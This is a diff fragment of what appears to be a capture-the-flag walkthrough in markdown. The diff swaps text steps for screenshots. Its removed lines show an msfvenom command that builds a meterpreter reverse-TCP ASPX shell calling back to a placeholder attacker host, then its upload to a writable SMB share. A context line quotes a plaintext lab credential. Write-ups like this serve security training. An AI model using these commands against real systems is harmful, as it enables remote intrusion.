@@ -76,22 +76,43 @@ Bill:Juw4nnaM4n420696969!<br>
 <p>The network share from ‘nt4wrksv’ is writeable</p>
 
 <br>
-msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=[Attack VM] lport=[Attack Port] -f aspx -o shell.aspx
 
 
-![image](https://github.com/user-attachments/assets/c26bbeaa-d518-48f5-8f71-53313d5b859a)
-
-<br>
-put shell.aspx<br>
-
-
-![image](https://github.com/user-attachments/assets/d06aa0f6-45e5-405e-84e1-a5e6e8669aca)
-
+![image](https://github.com/user-attachments/assets/001dd077-12db-42cd-997e-9b8e9bf09bf1)
 
 <br>
-msfupdate<br>
-msfconsole<br>
-msf6><br>
+
+![image](https://github.com/user-attachments/assets/f05dc433-a04a-4aff-bbfc-149e53a58f73)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/25368979-8d6c-46c0-9214-d96a2f719f43)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/47df1b9a-2bcc-42d1-8c13-ce95595fb55d)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/59bd97dd-4242-4911-bfcf-24df5f91f04d)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/784dd442-1bb3-4451-a623-68634f06b292)
+
+<br>
+
+
+![image](https://github.com/user-attachments/assets/e1fc7491-c8b4-4bfd-978e-b4f455a5c081)
+
+<br>
+
+
+
+
+
+
+
 
 
 
